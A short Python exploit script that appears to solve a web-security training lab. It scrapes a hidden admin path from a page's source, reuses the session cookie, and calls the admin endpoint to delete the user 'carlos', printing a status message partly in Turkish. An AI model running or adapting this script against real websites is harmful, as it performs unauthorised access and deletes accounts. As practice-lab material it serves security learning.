import requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from bs4 import BeautifulSoup
import re

proxies = {'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080' }

def  delete_user(url):
    r = requests.get(url , verify=False, proxies=proxies )

    session_cookie = r.cookies.get_dict().get('session')

    soup = BeautifulSoup(r.text, 'lxml')
    admin_ins = soup.find(string = re.compile("/admin-"))
    admin_path = re.search("href', '(.*)'", admin_ins).group(1)
    print(admin_path)

    cookies = {"session" : session_cookie}
    delete_carlos_url = url+admin_path+'/delete?username=carlos'
    r= requests.get(delete_carlos_url, cookies=cookies, verify=False, proxies=proxies ) 
    if r.status_code==200:
         print("[+] Carlos Delete Completed")
    else:
          print("[-] Carlos Delete Error")
          sys.exit(-1)


if __name__ == "__main__":
    if len(sys.argv) !=2:
          print("(+) usage %s <url>" %sys.argv[0])
          print("(+) Example Url  %s www.example.com " %sys.argv[0])
          sys.exit(-1)
    
    url = sys.argv[1]
    print("[+] Admin panel arıyorum.......")
    delete_user(url)
